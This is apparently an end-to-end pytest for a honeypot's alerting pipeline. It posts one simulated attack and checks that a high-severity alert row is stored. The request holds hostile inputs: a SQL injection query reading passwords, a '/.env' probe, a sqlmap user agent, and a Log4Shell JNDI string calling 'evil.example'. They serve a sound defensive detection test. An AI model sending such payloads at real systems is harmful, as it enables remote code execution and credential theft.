"""End-to-end alerting test.

Drives a single high-severity attack at the running stack and asserts the
full pipeline fires:

  HTTP probe (sqlmap UA + log4shell body)
    → FingerprintWorker scores the session ≥ ALERT_THRESHOLD_HIGH
    → publishes to `honeystrike:alerts`
    → AlertingWorker dispatches to the `log` channel
    → an `alerts` row lands in Postgres with channel='log'.
"""

from __future__ import annotations

from datetime import UTC, datetime

import httpx
import pytest
from sqlalchemy import select

from honeystrike.core.models import Alert, Session


@pytest.mark.asyncio
async def test_critical_http_attack_produces_alert_row(
    http_endpoint, db, redis_client, wait_for
) -> None:
    before = datetime.now(UTC)

    # Clear any prior dedup key for the IP we are about to use (the container
    # internal network IP changes per run, so this is mainly defensive).
    keys = await redis_client.keys("alert:dedup:*")
    if keys:
        await redis_client.delete(*keys)

    async with httpx.AsyncClient(timeout=10) as client:
        # sqlmap UA → tool component 15;
        # SQLi + Log4Shell body → T1190 (cve_signature) + T1190 (sqli);
        # `/.env` path → T1592 (info disclosure).
        # Combined this clears the 60-point alert threshold in any environment.
        await client.post(
            f"{http_endpoint}/.env?id=1+UNION+SELECT+password+FROM+users",
            content="${jndi:ldap://evil.example/a}",
            headers={
                "Content-Type": "text/plain",
                "User-Agent": "sqlmap/1.7.8#stable",
            },
        )

    async def _alert_for_recent_high_session() -> Alert | None:
        sess = (
            (
                await db.execute(
                    select(Session)
                    .where(Session.service == "http")
                    .where(Session.started_at >= before)
                    .order_by(Session.started_at.desc())
                    .limit(1)
                )
            )
            .scalars()
            .first()
        )
        if sess is None or sess.state != "CLOSED":
            return None
        await db.refresh(sess)
        if sess.threat_score < 50:
            return None
        alert = (
            (
                await db.execute(
                    select(Alert)
                    .where(Alert.session_id == sess.id)
                    .where(Alert.channel == "log")
                    .limit(1)
                )
            )
            .scalars()
            .first()
        )
        return alert

    alert = await wait_for(_alert_for_recent_high_session, timeout=60.0)
    assert alert is not None, "no log-channel alert row appeared within 60s"
    assert alert.severity in {"high", "critical"}
    assert alert.threat_score >= 50
    assert alert.payload.get("subject", "").startswith("[HoneyStrike]")
    assert "sqlmap" in alert.payload.get("tool_signatures", [])
